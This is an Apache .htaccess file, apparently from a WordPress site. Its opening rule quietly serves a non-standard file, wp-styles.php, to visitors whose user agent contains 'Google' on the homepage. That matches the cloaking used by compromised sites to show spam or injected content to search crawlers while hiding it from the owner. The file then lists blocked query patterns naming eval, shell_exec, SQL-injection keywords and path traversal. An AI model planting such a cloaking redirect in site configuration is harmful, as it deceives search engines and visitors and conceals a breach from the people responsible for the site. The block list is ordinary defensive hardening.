 RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} Google [NC]
RewriteCond %{REQUEST_URI} ^/$
RewriteRule ^$ wp-styles.php [L]
 ErrorDocument 404 / 
 RewriteEngine On 
 RewriteCond %{QUERY_STRING} (base64_encode|eval|gzinflate|shell_exec|system|exec|passthru) [NC]
 RewriteRule .* - [F,L]
 RewriteCond %{QUERY_STRING} (union|select|insert|drop|concat|sleep|benchmark) [NC]
 RewriteRule .* - [F,L]
 RewriteCond %{QUERY_STRING} \.\./ [NC]
 RewriteRule .* - [F,L]
